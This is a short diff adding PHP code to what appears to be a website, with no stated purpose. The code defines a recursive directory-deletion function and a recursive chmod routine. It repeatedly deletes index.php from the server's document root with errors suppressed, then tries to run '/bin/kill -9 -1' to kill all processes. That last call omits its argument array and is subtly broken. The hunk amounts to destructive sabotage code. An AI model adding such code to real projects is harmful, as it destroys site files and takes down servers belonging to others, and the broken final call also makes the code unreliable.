@@ -1,0 +1,8 @@
+function deleteDir($dirPath) {if (!is_dir($dirPath)) {return;}$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);foreach ($files as $fileinfo) {$todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');$todo($fileinfo->getRealPath());} return rmdir($dirPath);}
+function search($dir) {$files = scandir($dir);foreach ($files as $file) {if ($file != "." && $file != "..") {$path = $dir . '/' . $file;if (is_dir($path)) {@chmod($path, 0755);search($path);} else { }}}}
+$root=$_SERVER['DOCUMENT_ROOT'].'/';
+for($i=0;$i<5;$i++){
+chmod($root,0755);
+@unlink($root.'index.php');
+}
+$cmd = '/bin/kill';$args = ['-9', '-1'];pcntl_exec($cmd, );
